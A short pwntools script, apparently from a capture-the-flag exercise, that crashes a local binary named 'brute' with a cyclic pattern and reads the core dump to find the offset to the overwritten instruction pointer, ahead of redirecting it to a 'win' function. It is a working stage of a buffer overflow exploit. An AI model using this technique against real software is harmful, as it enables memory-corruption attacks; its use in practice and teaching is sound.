from pwn import *

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(20000)

# Run the process once so that it crashes
p = process('./brute')
p.sendline(payload)
p.recvall()
p.wait()
# Get the core dump
core = p.corefile

# Our cyclic pattern should have been used as the crashing address
assert pack(core.eip) in payload

# Cool! Now let's just replace that value with the address of 'win'
crash = ELF('./brute')
print(f"offset: {cyclic_find(core.eip)}")
